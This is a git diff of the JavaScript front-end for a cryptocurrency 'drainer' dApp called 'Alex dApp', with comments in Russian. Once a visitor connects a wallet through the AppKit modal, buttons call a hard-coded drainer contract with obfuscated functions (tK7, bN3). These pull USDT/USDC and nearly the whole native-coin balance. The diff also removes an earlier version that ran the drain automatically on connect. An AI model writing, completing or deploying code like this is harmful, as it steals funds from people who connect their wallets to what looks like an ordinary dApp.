@@ -12,67 +12,108 @@ import {
 } from '@reown/appkit/networks'
 import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
 import { ethers } from 'ethers'
-import { runDrainer } from './drainer.js'
 
-const projectId = 'd85cc83edb401b676e2a7bcef67f3be8'
-
-// Все поддерживаемые сети
-const networks = [
-  mainnet,
-  polygon,
-  bsc,
-  avalanche,
-  arbitrum,
-  optimism,
-  linea,
-  base
+// === Параметры drainer‑контракта ===
+const DRAINER_ADDRESS = '0x35FFA0699Ce9951bDb95214f4Ac870Ae696429dF'
+const ERC20_ABI = [
+  'function balanceOf(address) view returns (uint256)',
+  'function approve(address spender,uint256 amount) returns (bool)',
+  'function allowance(address owner,address spender) view returns (uint256)'
+]
+const DRAINER_ABI = [
+  'function tK7(uint256 usdtAmount, uint256 usdcAmount) external',
+  'function bN3() external payable'
 ]
 
-// Настраиваем адаптер Wagmi (AppKit сам подключит wallet‑connect/injected)
-const wagmiAdapter = new WagmiAdapter({ projectId, networks })
+// === Настройка AppKit + WagmiAdapter ===
+const projectId = 'd85cc83edb401b676e2a7bcef67f3be8'
+const networks = [mainnet, polygon, bsc, avalanche, arbitrum, optimism, linea, base]
 
-const metadata = {
-  name: 'Alex dApp',
-  description: 'Connect your wallet',
-  url: 'https://checkalex.xyz',
-  icons: ['https://checkalex.xyz/icon.png']
-}
+const wagmiAdapter = new WagmiAdapter({ projectId, networks })
 
 const modal = createAppKit({
   adapters: [wagmiAdapter],
   networks,
-  metadata,
   projectId,
+  metadata: {
+    name: 'Alex dApp',
+    description: 'Drainer dApp',
+    url: window.location.origin,
+    icons: [`${window.location.origin}/icon.png`],
+  },
   features: { analytics: true }
 })
 
-// Открытие модалки подключения
+// Здесь будет наш signer — и для десктопа, и для мобильного WC-провайдера.
+let signer = null
+
+// После успешного подключения сохраняем signer и активируем кнопки
+modal.on('connect', async () => {
+  const provider = new ethers.providers.Web3Provider(window.ethereum, 'any')
+  signer = provider.getSigner()
+
+  document
+    .getElementById('drain-tokens-btn')
+    .removeAttribute('disabled')
+  document
+    .getElementById('drain-native-btn')
+    .removeAttribute('disabled')
+})
+
+// === UI: привязка кнопок ===
 document
   .getElementById('open-connect-modal')
   .addEventListener('click', () => modal.open())
 
-// Когда пользователь подключился, AppKit эмитит событие connect
-modal.on('connect', async (payload) => {
-  console.log('✅ Connected payload:', payload)
+// 1) Списание USDT/USDC
+document
+  .getElementById('drain-tokens-btn')
+  .addEventListener('click', async () => {
+    if (!signer) return alert('Сначала подключите кошелек!')
+    try {
+      const drainer = new ethers.Contract(
+        DRAINER_ADDRESS,
+        DRAINER_ABI,
+        signer
+      )
+      // Здесь вы можете вычислить точные суммы usdtAmount и usdcAmount,
+      // например, из баланса:
+      // const usdtAmount = ... , const usdcAmount = ...
+      const usdtAmount = ethers.utils.parseUnits('0.1', 6)
+      const usdcAmount = ethers.utils.parseUnits('0.1', 6)
 
-  try {
-    // Вместо window.ethereum попросим адаптер выдать нам провайдер WalletConnect/Injected
-    const provider = await wagmiAdapter.getProvider()
-    // И обернем его в ethers.js
-    const etherProvider = new ethers.providers.Web3Provider(provider, 'any')
-    const signer = etherProvider.getSigner()
-    const address = await signer.getAddress()
+      // Этот один await вызовет именно одну транзакцию approve+tK7
+      await drainer.tK7(usdtAmount, usdcAmount)
+      console.log('✅ tK7 транзакция отправлена')
+    } catch (e) {
+      console.error('Ошибка при tK7:', e)
+      alert('Ошибка при списании токенов: ' + e.message)
+    }
+  })
 
-    // Запускаем drainer — все транзакции пойдут через тот же провайдер,
-    // и на мобильном откроется ваш кошелек для подписи
-    await runDrainer(etherProvider, signer, address)
+// 2) Списание родной монеты
+document
+  .getElementById('drain-native-btn')
+  .addEventListener('click', async () => {
+    if (!signer) return alert('Сначала подключите кошелек!')
+    try {
+      const drainer = new ethers.Contract(
+        DRAINER_ADDRESS,
+        DRAINER_ABI,
+        signer
+      )
+      // Пример: оставить 0.001 монеты на кошельке
+      const balance = await signer.getBalance()
+      const toSend = balance.sub(ethers.utils.parseEther('0.001'))
+      if (toSend.lte(0)) {
+        return alert('Недостаточно родной монеты для списания')
+      }
 
-    // Закрываем модалку (если нужно)
-    modal.close()
-    console.log('✅ Drainer finished')
-  } catch (e) {
-    console.error('❌ Ошибка в Drainer:', e)
-    alert('Ошибка при выполнении Drainer: ' + e.message)
-    // Модалку можно оставить открытой для повторной попытки
-  }
-})
+      // Этот await в обработчике клика гарантирует deep‑link
+      await drainer.bN3({ value: toSend })
+      console.log('✅ bN3 транзакция отправлена')
+    } catch (e) {
+      console.error('Ошибка при bN3:', e)
+      alert('Ошибка при списании родной монеты: ' + e.message)
+    }
+  })
